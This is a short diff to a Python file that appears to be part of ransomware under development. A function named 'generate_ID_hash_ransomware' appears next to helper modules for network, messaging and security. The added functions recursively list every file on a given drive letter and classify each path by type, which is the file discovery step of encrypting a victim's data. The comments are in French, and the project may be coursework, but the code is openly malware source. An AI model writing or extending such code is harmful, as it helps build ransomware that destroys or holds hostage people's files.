@@ -1,15 +1,40 @@
-import socket
 from datetime import datetime
+import socket
 import hashlib
 import sys
+import os
+import glob
 import psutil
 import utile.network as net
 import utile.message as message
 import utile.security as secu
 
+
 HASH = None
 STATE = 'INITIALIZE'
 
+
+def explore(chemin):
+    """
+
+    :param chemin: chemin que la fonction glob utilisera pour retourner les chemins de fichiers
+    :return: list, liste contenant tous les chemins des fichiers exploré avec le chemin donné
+    """
+    chemin_str = str(chemin)
+    path_files = glob.glob(f'{chemin_str}:/**/*', recursive = True)
+
+    return path_files
+
+def file_type(chemin):
+
+    type = ''
+
+    if os.path.isdir(chemin):
+        type = 'dir'
+    elif os.path.isfile(chemin):
+        type = str(chemin)[-5:-1]
+
+    return type
 
 def generate_ID_hash_ransomware():
     """
